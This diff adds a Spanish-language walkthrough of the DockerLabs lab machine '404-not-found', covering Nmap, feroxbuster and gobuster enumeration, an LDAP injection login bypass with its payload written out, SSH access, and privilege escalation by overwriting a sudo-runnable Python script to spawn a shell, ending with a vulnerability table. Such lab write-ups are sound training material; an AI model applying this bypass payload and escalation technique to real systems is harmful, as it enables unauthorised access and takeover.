@@ -1,0 +1,243 @@
+---
+title: test
+description: Resolución completa de la máquina virtual *404-not-found* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **404-not-found**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web que redirige a un dominio virtual. Mediante enumeración de subdominios, se descubre `info.404-not-found.hl`, que contiene un formulario de login vulnerable a **LDAP Injection**. Esta vulnerabilidad permite el bypass de autenticación y el acceso a un panel de administración que revela credenciales SSH del usuario `404-page`.
+Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar y sobrescribir un script Python como el usuario `200-ok`. Con acceso a esta cuenta, se encuentra un archivo con la contraseña de `root` en texto plano, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: '404-not-found',
+    Autor: 'd1se0',
+    Dificultad: 'Media',
+    Fecha: '24/08/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip 404-not-found.zip
+sudo bash auto_deploy.sh 404-not-found.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p 404-not-found/{content,exploits,nmap,scripts}
+cd 404-not-found
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764737133/Ports_spmuaf.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Al acceder a `http://172.17.0.2`, se redirige al dominio `404-not-found.hl`. Se agrega al `/etc/hosts`:
+
+```bash
+echo "172.17.0.2 404-not-found.hl" | sudo tee -a /etc/hosts
+```
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://404-not-found.hl -d 0 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirectoryList2.3-medium.txt \
+  -x php,txt,html,js,bak,old \
+  -t 40 -C 404,403
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1764737132/Feroxbuster_vupyvf.png)
+
+**Rutas relevantes:**
+- `/index` — Página principal.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1764737133/Index_egc2qc.png)
+- `/participar.html` — Contiene una pista codificada en Base64.
+  ![Participar](https://res.cloudinary.com/dewqswzke/image/upload/v1764737133/Participar_pjb1pd.png)
+
+---
+
+### 1.4 Enumeración de subdominios
+
+La pista sugiere revisar el dominio. Se realiza enumeración de subdominios:
+
+```bash
+gobuster vhost -u http://404-not-found.hl \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+  --append-domain -r
+```
+
+![Gobuster DNS](https://res.cloudinary.com/dewqswzke/image/upload/v1764737132/GobusterDns_xaliks.png)
+
+Se descubre el subdominio `info.404-not-found.hl`. Se agrega al `/etc/hosts`:
+
+```bash
+echo "172.17.0.2 info.404-not-found.hl" | sudo tee -a /etc/hosts
+```
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 LDAP Injection
+
+El subdominio contiene un formulario de login:
+
+![Login](https://res.cloudinary.com/dewqswzke/image/upload/v1764737132/Login_hjlviu.png)
+
+Revisando el código fuente, se confirma que el sistema usa **LDAP**:
+
+![Code](https://res.cloudinary.com/dewqswzke/image/upload/v1764737132/Code_is20h1.png)
+
+Se prueba un bypass de LDAP Injection:
+
+```
+user: *)(uid=*))(|(uid=*
+pass: *)(uid=*))(|(uid=*
+```
+
+El bypass es exitoso, otorgando acceso al panel de administración:
+
+![Bypass](https://res.cloudinary.com/dewqswzke/image/upload/v1764737132/ByPass_n9kogg.png)
+
+### 2.2 Credenciales SSH
+
+Dentro del panel se encuentran credenciales SSH:
+
+```
+Usuario: 404-page
+Contraseña: <obtenida en el panel>
+```
+
+Se accede al sistema:
+
+```bash
+ssh 404-page@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1764737133/SSH_d4kjob.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De 404-page → 200-ok
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1764737135/Sudo-l404_w7bogz.png)
+
+Se puede ejecutar `calculator.py` como `200-ok`. El archivo no es legible pero sí ejecutable y se puede sobrescribir.
+
+Se elimina y recrea con un payload:
+
+```bash
+rm calculator.py
+echo '#!/usr/bin/env python3
+import os
+os.system("/bin/bash")' > calculator.py
+chmod +x calculator.py
+sudo -u 200-ok /home/404-page/calculator.py
+```
+
+![200-ok](https://res.cloudinary.com/dewqswzke/image/upload/v1764737132/200-ok_y5rxai.png)
+
+### 3.2 De 200-ok → root
+
+En el home de `200-ok` se encuentra el archivo `boss.txt` con la contraseña de `root`:
+
+```bash
+cat boss.txt
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764737133/Root_hpk6oj.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "LDAP Injection en formulario de login",
+      severity: "Crítica",
+      impact: "Bypass de autenticación y acceso al panel de administración"
+    },
+    {
+      vulnerability: "Credenciales expuestas en panel de administración",
+      severity: "Alta",
+      impact: "Acceso SSH al sistema"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en script Python",
+      severity: "Alta",
+      impact: "Movimiento lateral al usuario 200-ok"
+    },
+    {
+      vulnerability: "Contraseña de root almacenada en texto plano",
+      severity: "Crítica",
+      impact: "Escalada directa de privilegios a root"
+    }
+  ]}
+/>
